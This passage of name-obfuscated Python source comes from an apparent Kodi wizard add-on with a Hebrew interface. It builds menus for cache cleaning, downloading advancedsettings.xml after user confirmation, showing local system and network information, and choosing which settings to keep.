		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOO00O00OO00OO00O ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2894
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2895
	addFile ('ניקוי אוטומטי בהפעלה: %s'%OO0000O00O0OOO000 .replace ('true',OO0OOO000OOOO0O0O ).replace ('false',OO00OOOOOOO0O00OO ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2896
	if OO0000O00O0OOO000 =='true':#line:2897
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%OOOO0O0O0O0O0OO00 [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2898
		addFile ('--- ניקוי קאש בהפעלה: %s'%OOO0O0O000OO0O00O .replace ('true',OO0OOO000OOOO0O0O ).replace ('false',OO00OOOOOOO0O00OO ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2899
		addFile ('--- ניקוי חבילות בהפעלה: %s'%OO00O00O00OOO0O0O .replace ('true',OO0OOO000OOOO0O0O ).replace ('false',OO00OOOOOOO0O00OO ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2900
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%O00000OO000OO00O0 .replace ('true',OO0OOO000OOOO0O0O ).replace ('false',OO00OOOOOOO0O00OO ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2901
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2902
	addFile ('Include Video Cache in Clear Cache: %s'%OOOOOO0O0OO0OOOOO .replace ('true',OO0OOO000OOOO0O0O ).replace ('false',OO00OOOOOOO0O00OO ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2903
	if OOOOOO0O0OO0OOOOO =='true':#line:2904
		addFile ('--- Include All Video Addons: %s'%O0O0000O000OOOO00 .replace ('true',OO0OOO000OOOO0O0O ).replace ('false',OO00OOOOOOO0O00OO ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2905
		addFile ('--- Include Bob: %s'%OOOO0O00OOO0O0OOO .replace ('true',OO0OOO000OOOO0O0O ).replace ('false',OO00OOOOOOO0O00OO ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2906
		addFile ('--- Include Phoenix: %s'%OO00OO0000OOOOOOO .replace ('true',OO0OOO000OOOO0O0O ).replace ('false',OO00OOOOOOO0O00OO ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2907
		addFile ('--- Include Specto: %s'%OO00O00000OOO0OOO .replace ('true',OO0OOO000OOOO0O0O ).replace ('false',OO00OOOOOOO0O00OO ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2908
		addFile ('--- Include Exodus: %s'%O0OO00000OOO0OO0O .replace ('true',OO0OOO000OOOO0O0O ).replace ('false',OO00OOOOOOO0O00OO ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2909
		addFile ('--- Include Salts: %s'%O0OOO00O0O000000O .replace ('true',OO0OOO000OOOO0O0O ).replace ('false',OO00OOOOOOO0O00OO ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2910
		addFile ('--- Include Salts HD Lite: %s'%OOO00O0O0OOOO000O .replace ('true',OO0OOO000OOOO0O0O ).replace ('false',OO00OOOOOOO0O00OO ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2911
		addFile ('--- Include One Channel: %s'%O0000OO0O0O0OOOO0 .replace ('true',OO0OOO000OOOO0O0O ).replace ('false',OO00OOOOOOO0O00OO ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2912
		addFile ('--- Include Genesis: %s'%O00000O00O000O0OO .replace ('true',OO0OOO000OOOO0O0O ).replace ('false',OO00OOOOOOO0O00OO ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2913
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2914
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2915
	setView ('files','viewType')#line:2916
def advancedWindow (url =None ):#line:2918
	if not ADVANCEDFILE =='http://':#line:2919
		if url ==None :#line:2920
			OO0OOOOOOOOOO0000 =wiz .workingURL (ADVANCEDFILE )#line:2921
			OO0OO0OO0OOO00O0O =uservar .ADVANCEDFILE #line:2922
		else :#line:2923
			OO0OOOOOOOOOO0000 =wiz .workingURL (url )#line:2924
			OO0OO0OO0OOO00O0O =url #line:2925
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2926
		if os .path .exists (ADVANCED ):#line:2927
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2928
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2929
		if OO0OOOOOOOOOO0000 ==True :#line:2930
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2931
			OOO00O0O0O0OOOOOO =wiz .openURL (OO0OO0OO0OOO00O0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2932
			O00O00O0O00O0O0O0 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OOO00O0O0O0OOOOOO )#line:2933
			if len (O00O00O0O00O0O0O0 )>0 :#line:2934
				for OOO0OOOO00OOOOOOO ,O000OO000OOOOO00O ,url ,OO0OOO0O0OO0O0000 ,OO0O00OOOOOOO00O0 ,OOO00O000O000OO0O in O00O00O0O00O0O0O0 :#line:2935
					if O000OO000OOOOO00O .lower ()=="yes":#line:2936
						addDir ("[B]%s[/B]"%OOO0OOOO00OOOOOOO ,'advancedsetting',url ,description =OOO00O000O000OO0O ,icon =OO0OOO0O0OO0O0000 ,fanart =OO0O00OOOOOOO00O0 ,themeit =THEME3 )#line:2937
					else :#line:2938
						addFile (OOO0OOOO00OOOOOOO ,'writeadvanced',OOO0OOOO00OOOOOOO ,url ,description =OOO00O000O000OO0O ,icon =OO0OOO0O0OO0O0000 ,fanart =OO0O00OOOOOOO00O0 ,themeit =THEME2 )#line:2939
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2940
		else :wiz .log ("[Advanced Settings] URL not working: %s"%OO0OOOOOOOOOO0000 )#line:2941
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2942
def writeAdvanced (O0O00OOOO00O00OOO ,OO00O000OOOOOOO0O ):#line:2944
	O0OO0OOO000O0OOO0 =wiz .workingURL (OO00O000OOOOOOO0O )#line:2945
	if O0OO0OOO000O0OOO0 ==True :#line:2946
		if os .path .exists (ADVANCED ):OO0OO0OO0O0000O00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O0O00OOOO00O00OOO ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2947
		else :OO0OO0OO0O0000O00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O0O00OOOO00O00OOO ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2948
		if OO0OO0OO0O0000O00 ==1 :#line:2950
			O00OO0O00O0OOOOOO =wiz .openURL (OO00O000OOOOOOO0O )#line:2951
			O00O0O0000O0O00O0 =open (ADVANCED ,'w');#line:2952
			O00O0O0000O0O00O0 .write (O00OO0O00O0OOOOOO )#line:2953
			O00O0O0000O0O00O0 .close ()#line:2954
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2955
			wiz .killxbmc (True )#line:2956
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2957
	else :wiz .log ("[Advanced Settings] URL not working: %s"%O0OO0OOO000O0OOO0 );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2958
def viewAdvanced ():#line:2960
	OOOO00O0OOOOOOOO0 =open (ADVANCED )#line:2961
	O000000O0O0O0OOO0 =OOOO00O0OOOOOOOO0 .read ().replace ('\t','    ')#line:2962
	wiz .TextBox (ADDONTITLE ,O000000O0O0O0OOO0 )#line:2963
	OOOO00O0OOOOOOOO0 .close ()#line:2964
def removeAdvanced ():#line:2966
	if os .path .exists (ADVANCED ):#line:2967
		wiz .removeFile (ADVANCED )#line:2968
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2969
def showAutoAdvanced ():#line:2971
	notify .autoConfig ()#line:2972
def getIP ():#line:2974
	OO00O0O0000OOO00O ='http://whatismyipaddress.com/'#line:2975
	if not wiz .workingURL (OO00O0O0000OOO00O ):return 'Unknown','Unknown','Unknown'#line:2976
	O000OOO0OOO000OOO =wiz .openURL (OO00O0O0000OOO00O ).replace ('\n','').replace ('\r','')#line:2977
	if not 'Access Denied'in O000OOO0OOO000OOO :#line:2978
		O00OOO00OO0OOOOOO =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (O000OOO0OOO000OOO )#line:2979
		OOO0OO000O0O0OO0O =O00OOO00OO0OOOOOO [0 ]if (len (O00OOO00OO0OOOOOO )>0 )else 'Unknown'#line:2980
		OO00OO00OO0OOO0OO =re .compile ('"font-size:14px;">(.+?)</td>').findall (O000OOO0OOO000OOO )#line:2981
		OO0OO00OO00OO0000 =OO00OO00OO0OOO0OO [0 ]if (len (OO00OO00OO0OOO0OO )>0 )else 'Unknown'#line:2982
		OO0OO0O0O0OO00000 =OO00OO00OO0OOO0OO [1 ]+', '+OO00OO00OO0OOO0OO [2 ]+', '+OO00OO00OO0OOO0OO [3 ]if (len (OO00OO00OO0OOO0OO )>2 )else 'Unknown'#line:2983
		return OOO0OO000O0O0OO0O ,OO0OO00OO00OO0000 ,OO0OO0O0O0OO00000 #line:2984
	else :return 'Unknown','Unknown','Unknown'#line:2985
def systemInfo ():#line:2987
	O0O0OOO0O0000O0O0 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:3001
	OO0O000O00O0OOOO0 =[];OOOO0O00OO0OOO0O0 =0 #line:3002
	for OOO00000O000O0O0O in O0O0OOO0O0000O0O0 :#line:3003
		O0OO0O0OOO000O0OO =wiz .getInfo (OOO00000O000O0O0O )#line:3004
		O000000OO0O00OO00 =0 #line:3005
		while O0OO0O0OOO000O0OO =="Busy"and O000000OO0O00OO00 <10 :#line:3006
			O0OO0O0OOO000O0OO =wiz .getInfo (OOO00000O000O0O0O );O000000OO0O00OO00 +=1 ;wiz .log ("%s sleep %s"%(OOO00000O000O0O0O ,str (O000000OO0O00OO00 )));xbmc .sleep (1000 )#line:3007
		OO0O000O00O0OOOO0 .append (O0OO0O0OOO000O0OO )#line:3008
		OOOO0O00OO0OOO0O0 +=1 #line:3009
	O000O000OO0O0O000 =OO0O000O00O0OOOO0 [8 ]if 'Una'in OO0O000O00O0OOOO0 [8 ]else wiz .convertSize (int (float (OO0O000O00O0OOOO0 [8 ][:-8 ]))*1024 *1024 )#line:3010
	O000O0O0OO000000O =OO0O000O00O0OOOO0 [9 ]if 'Una'in OO0O000O00O0OOOO0 [9 ]else wiz .convertSize (int (float (OO0O000O00O0OOOO0 [9 ][:-8 ]))*1024 *1024 )#line:3011
	O00OOOOOOO00OOO00 =OO0O000O00O0OOOO0 [10 ]if 'Una'in OO0O000O00O0OOOO0 [10 ]else wiz .convertSize (int (float (OO0O000O00O0OOOO0 [10 ][:-8 ]))*1024 *1024 )#line:3012
	O0O000000OOO0O000 =wiz .convertSize (int (float (OO0O000O00O0OOOO0 [11 ][:-2 ]))*1024 *1024 )#line:3013
	OOO0O0000OOOO0O0O =wiz .convertSize (int (float (OO0O000O00O0OOOO0 [12 ][:-2 ]))*1024 *1024 )#line:3014
	O0O0O0O0OO0OO0000 =wiz .convertSize (int (float (OO0O000O00O0OOOO0 [13 ][:-2 ]))*1024 *1024 )#line:3015
	O000000OO00O0OOO0 ,O000O0000O0O0O0OO ,O00OOOOO0000O0O0O =getIP ()#line:3016
	O0O0OO0OOOOO00O00 =[];O000O0O00O0OOO0O0 =[];O000O00OO00O000O0 =[];O0O00OO0O0OO0OOOO =[];O0000000O000O0OOO =[];O0O0000O0OOO0OOOO =[];O0O00OO0O0OO0O000 =[]#line:3018
	OOOO0O00O0OO0O0O0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3020
	for O0000OOOOO0OOO000 in sorted (OOOO0O00O0OO0O0O0 ,key =lambda OOO0O0O00O0O00OO0 :OOO0O0O00O0O00OO0 ):#line:3021
		OO0OOO000OO00000O =os .path .split (O0000OOOOO0OOO000 [:-1 ])[1 ]#line:3022
		if OO0OOO000OO00000O =='packages':continue #line:3023
		O0O0O0O00O0OOOOOO =os .path .join (O0000OOOOO0OOO000 ,'addon.xml')#line:3024
		if os .path .exists (O0O0O0O00O0OOOOOO ):#line:3025
			OO0OO0OO0O00OOO00 =open (O0O0O0O00O0OOOOOO )#line:3026
			O0O0OO0O00OO0OO00 =OO0OO0OO0O00OOO00 .read ()#line:3027
			O0OOOOO0OO000OOOO =re .compile ("<provides>(.+?)</provides>").findall (O0O0OO0O00OO0OO00 )#line:3028
			if len (O0OOOOO0OO000OOOO )==0 :#line:3029
				if OO0OOO000OO00000O .startswith ('skin'):O0O00OO0O0OO0O000 .append (OO0OOO000OO00000O )#line:3030
				if OO0OOO000OO00000O .startswith ('repo'):O0000000O000O0OOO .append (OO0OOO000OO00000O )#line:3031
				else :O0O0000O0OOO0OOOO .append (OO0OOO000OO00000O )#line:3032
			elif not (O0OOOOO0OO000OOOO [0 ]).find ('executable')==-1 :O0O00OO0O0OO0OOOO .append (OO0OOO000OO00000O )#line:3033
			elif not (O0OOOOO0OO000OOOO [0 ]).find ('video')==-1 :O000O00OO00O000O0 .append (OO0OOO000OO00000O )#line:3034
			elif not (O0OOOOO0OO000OOOO [0 ]).find ('audio')==-1 :O000O0O00O0OOO0O0 .append (OO0OOO000OO00000O )#line:3035
			elif not (O0OOOOO0OO000OOOO [0 ]).find ('image')==-1 :O0O0OO0OOOOO00O00 .append (OO0OOO000OO00000O )#line:3036
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3038
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O000O00O0OOOO0 [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3039
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O000O00O0OOOO0 [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3040
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:3041
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O000O00O0OOOO0 [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3042
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O000O00O0OOOO0 [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3043
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3045
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O000O00O0OOOO0 [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3046
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O000O00O0OOOO0 [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3047
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3049
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O000OO0O0O000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3050
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O0O0OO000000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3051
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OOOOOOO00OOO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3052
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3054
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000000OOO0O000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3055
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O0000OOOO0O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3056
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0O0O0OO0OO0000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3057
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3059
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O000O00O0OOOO0 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3060
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000000OO00O0OOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3061
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O0000O0O0O0OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3062
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OOOOO0000O0O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3063
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O000O00O0OOOO0 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3064
	OO00000O0O0OO0000 =len (O0O0OO0OOOOO00O00 )+len (O000O0O00O0OOO0O0 )+len (O000O00OO00O000O0 )+len (O0O00OO0O0OO0OOOO )+len (O0O0000O0OOO0OOOO )+len (O0O00OO0O0OO0O000 )+len (O0000000O000O0OOO )#line:3066
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,OO00000O0O0OO0000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3067
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O000O00OO00O000O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3068
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O00OO0O0OO0OOOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3069
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O000O0O00O0OOO0O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3070
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O0OO0OOOOO00O00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3071
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0000000O000O0OOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3072
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O00OO0O0OO0O000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3073
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O0000O0OOO0OOOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3074
def Menu ():#line:3075
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:3076
def saveMenu ():#line:3078
	O0000000OO0O0000O ='[COLOR yellow]מופעל[/COLOR]';OOO00000OO0OO000O ='[COLOR blue]מבוטל[/COLOR]'#line:3080
	OOOOO00O0O00OOO0O ='true'if KEEPMOVIEWALL =='true'else 'false'#line:3081
	O000O00OO0O00OOOO ='true'if KEEPMOVIELIST =='true'else 'false'#line:3082
	OOO0O0OO0OO0OO000 ='true'if KEEPINFO =='true'else 'false'#line:3083
	O0000O00O00O0OOO0 ='true'if KEEPSOUND =='true'else 'false'#line:3085
	OO0O00OOOOOOOOO00 ='true'if KEEPVIEW =='true'else 'false'#line:3086
	OO0000OO0O00OOOO0 ='true'if KEEPSKIN =='true'else 'false'#line:3087
	O0O0OOOOO0OOO0OO0 ='true'if KEEPSKIN2 =='true'else 'false'#line:3088
	OOOO000OOOOOO0OOO ='true'if KEEPSKIN3 =='true'else 'false'#line:3089
	OO0OOOOOO0O0OO00O ='true'if KEEPADDONS =='true'else 'false'#line:3090
	O00OOO0O000OO0000 ='true'if KEEPPVR =='true'else 'false'#line:3091
	O0OOO0O0OO00000OO ='true'if KEEPTVLIST =='true'else 'false'#line:3092
	O0OO0OOOOO00OO000 ='true'if KEEPHUBMOVIE =='true'else 'false'#line:3093
	OO0O0OO0000000OO0 ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:3094
	O0O000OOO0O0O000O ='true'if KEEPHUBTV =='true'else 'false'#line:3095
	OOOOOO0OOO00OOO0O ='true'if KEEPHUBVOD =='true'else 'false'#line:3096
	O00000O0OOO00O00O ='true'if KEEPHUBSPORT =='true'else 'false'#line:3097
	OO0O00O0O0O0O00OO ='true'if KEEPHUBKIDS =='true'else 'false'#line:3098
	OO0OO0OO00O000OO0 ='true'if KEEPHUBMUSIC =='true'else 'false'#line:3099
	O000O0O0O0OO0O0O0 ='true'if KEEPHUBMENU =='true'else 'false'#line:3100
	O0O0O000OOOO0OOO0 ='true'if KEEPPLAYLIST =='true'else 'false'#line:3101
	OO0O0O0OO00OO0O0O ='true'if KEEPTRAKT =='true'else 'false'#line:3102
	O0000OOO0000O000O ='true'if KEEPREAL =='true'else 'false'#line:3103
	OO0000O0O0O0OO00O ='true'if KEEPRD2 =='true'else 'false'#line:3104
	OOOOO00000O0000OO ='true'if KEEPTORNET =='true'else 'true'#line:3105
	OO000OO00O00O000O ='true'if KEEPLOGIN =='true'else 'false'#line:3106
	O00OOO000000OO0O0 ='true'if KEEPSOURCES =='true'else 'false'#line:3107
	O0OOOOO0OO000OO0O ='true'if KEEPADVANCED =='true'else 'false'#line:3108
	O00O00000O0OO00OO ='true'if KEEPPROFILES =='true'else 'false'#line:3109
	OOO0O00O0O0OOO000 ='true'if KEEPFAVS =='true'else 'false'#line:3110
	O00O000OO00O0O000 ='true'if KEEPREPOS =='true'else 'false'#line:3111
	O0O0OO00000O0OOO0 ='true'if KEEPSUPER =='true'else 'false'#line:3112
	O00OOOO00OO0000OO ='true'if KEEPWHITELIST =='true'else 'false'#line:3113
	O0OOOOOO0000O0OOO ='true'if KEEPWEATHER =='true'else 'false'#line:3114
	O0O0000OOO0OO0000 ='true'if KEEPVICTORY =='true'else 'false'#line:3115
	if O00OOOO00OO0000OO =='true':#line:3118
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:3119
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:3120
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:3121
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:3122
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:3123
	addFile ('%s שמירת חשבון RD:  '%O0000OOO0000O000O .replace ('true',O0000000OO0O0000O ).replace ('false',OOO00000OO0OO000O ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:3126
	addFile ('%s שמירת חשבון טראקט:  '%OO0O0O0OO00OO0O0O .replace ('true',O0000000OO0O0000O ).replace ('false',OOO00000OO0OO000O ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:3127
	addFile ('%s שמירת מועדפים:  '%OOO0O00O0O0OOO000 .replace ('true',O0000000OO0O0000O ).replace ('false',OOO00000OO0OO000O ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:3130
	addFile ('%s שמירת לקוח טלוויזיה:  '%O00OOO0O000OO0000 .replace ('true',O0000000OO0O0000O ).replace ('false',OOO00000OO0OO000O ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:3131
	addFile ('%s שמירת הגדרות הרחבה ויקטורי:  '%O0O0000OOO0OO0000 .replace ('true',O0000000OO0O0000O ).replace ('false',OOO00000OO0OO000O ),'togglesetting','keepvictory',icon =ICONTRAKT ,themeit =THEME1 )#line:3132
	addFile ('%s שמירת רשימת עורצי טלוויזיה:  '%O0OOO0O0OO00000OO .replace ('true',O0000000OO0O0000O ).replace ('false',OOO00000OO0OO000O ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:3133
	addFile ('%s שמירת אריח סרטים:  '%O0OO0OOOOO00OO000 .replace ('true',O0000000OO0O0000O ).replace ('false',OOO00000OO0OO000O ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:3134
	addFile ('%s שמירת אריח סדרות:  '%OO0O0OO0000000OO0 .replace ('true',O0000000OO0O0000O ).replace ('false',OOO00000OO0OO000O ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:3135
	addFile ('%s שמירת אריח טלויזיה:  '%O0O000OOO0O0O000O .replace ('true',O0000000OO0O0000O ).replace ('false',OOO00000OO0OO000O ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:3136
	addFile ('%s שמירת אריח תוכן ישראלי:  '%OOOOOO0OOO00OOO0O .replace ('true',O0000000OO0O0000O ).replace ('false',OOO00000OO0OO000O ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3137
	addFile ('%s שמירת אריח ספורט:  '%O00000O0OOO00O00O .replace ('true',O0000000OO0O0000O ).replace ('false',OOO00000OO0OO000O ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3138
	addFile ('%s שמירת אריח ילדים:  '%OO0O00O0O0O0O00OO .replace ('true',O0000000OO0O0000O ).replace ('false',OOO00000OO0OO000O ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:3139
	addFile ('%s שמירת אריח מוסיקה:  '%OO0OO0OO00O000OO0 .replace ('true',O0000000OO0O0000O ).replace ('false',OOO00000OO0OO000O ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:3140
	addFile ('%s שמירת תפריט אריחים ראשי:  '%O000O0O0O0OO0O0O0 .replace ('true',O0000000OO0O0000O ).replace ('false',OOO00000OO0OO000O ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:3141
	addFile ('%s שמירת כל האריחים בסקין:  '%OO0000OO0O00OOOO0 .replace ('true',O0000000OO0O0000O ).replace ('false',OOO00000OO0OO000O ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:3142
	addFile ('%s שמירת הגדרות מזג האוויר:  '%O0OOOOOO0000O0OOO .replace ('true',O0000000OO0O0000O ).replace ('false',OOO00000OO0OO000O ),'togglesetting','keepweather',icon =ICONTRAKT ,themeit =THEME1 )#line:3143
